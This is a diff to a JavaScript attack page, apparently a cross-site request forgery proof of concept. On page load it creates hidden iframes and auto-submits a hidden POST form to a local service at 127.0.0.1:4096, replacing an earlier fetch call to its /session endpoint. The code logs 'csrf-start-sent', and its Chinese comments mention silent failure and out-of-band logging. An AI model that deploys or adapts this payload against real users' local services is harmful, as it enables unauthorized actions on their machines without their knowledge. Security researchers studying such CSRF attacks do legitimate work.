@@ -13,20 +13,14 @@ window.onload = () => {
   f1.style.display = 'none';
   document.body.appendChild(f1);
 
-  // 替换原 form 提交：使用 fetch 发送等效的 curl 请求
-  fetch('http://127.0.0.1:4096/session', {
-    method: 'POST',
-    headers: {
-      'User-Agent': 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
-      'Connection': 'close',
-      'Content-Type': 'application/json',
-      'Accept-Encoding': 'gzip, deflate'
-    },
-    body: '{}'
-  }).catch(err => {
-    // 静默失败，或可选记录到外带（不干扰主要逻辑）
-    log('fetch-error: ' + err.message);
-  });
+
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'http://127.0.0.1:4096';
+  form.target = 'x';
+  form.style.display = 'none';
+  document.body.appendChild(form);
+  form.submit();
   log('csrf-start-sent');
 
   const f2 = document.createElement('iframe');
